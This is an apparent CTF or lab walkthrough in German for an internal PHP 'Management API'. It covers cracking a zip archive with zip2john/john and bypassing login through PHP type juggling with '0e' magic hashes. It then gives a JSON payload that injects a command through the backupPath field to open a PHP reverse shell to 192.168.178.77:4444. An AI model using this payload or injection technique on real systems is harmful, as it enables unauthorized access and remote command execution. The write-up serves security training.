# Management API

## Story
Diese API ist nur intern erreichbar und ist nur für Manager/Mitarbeiter. In der Datenbank hinter der API werden vor allem Mitarbeiter Daten abgespeichert. 

Über die API können Mitarbeiter hinzugefügt, bearbeitet oder gelöscht werden. 

Unter einem Endpoint der noch nicht richtig implementiert ist, kann der Webadmin ein Backup von der Datenbank mit einem bash script ausführen. 

## Backend API Code Backup
Der `www-data` nutzer findet auf dem System ein mit passwort verschlüsseltes zip Archiv. Dieses kann man mit `zip2john` und `john` relativ einfach knacken.  
Darin findet man folgendes:
 - den source code von der Management API
 - ein Postman collection export der API

Im Dockerfile sieht man, dass ein Passwort als Docker Secret vorhanden ist. 


## Exploit
Der Admin Hash ist in der Datenbank ist:

`0e731198061491163073197128363787`

Beim Type Juggling wird dies als mathematischer Ausdruck gewertet und evaluiert zu `0`.

Jeder String der mit `0e` beginnt und danach nur Zahlen hat wird genau gleich gewertet. 

Um die Type Juggling Vulnerability auszunützen können folgende Inputs verwendet werden: 

https://www.programmersought.com/article/20249285296/

Jeder dieser Werte kann genutzt werden, um die Authentication zu umgehen, da sie im Type Juggling zu `0` werden. 
Im Code wird also schlussendlich `0 == 0` ausgewertet und der Input wird als richtiges Passwort behandelt. 

### Payload
Um in der API die Type Juggling Vulnerability auszunützen, kann folgende Payload verwendet werden:
```
{
    "backupPath": "; php -r '$sock=fsockopen(\"192.168.178.77\",4444);$proc=proc_open(\"sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
    "email": "harald.lustig@company.com",
    "password": "s155964671a"
}
```
Die Reverse Shell kommt von [revshells.com](https://www.revshells.com/).


## Links:

[Docker Secret](https://docs.docker.com/compose/how-tos/use-secrets/)

[Docker PHP](https://hub.docker.com/_/php)

[Type Juggling #1](https://haymiz.dev/security/2024/06/13/type-juggling-vulnerability/)

[Type Juggling #2](https://secops.group/php-type-juggling-simplified/)

[PHP v7.4](https://www.centron.de/tutorial/php-7-4-auf-ubuntu-24-04-installieren-und-konfigurieren-eine-umfassende-anleitung/)


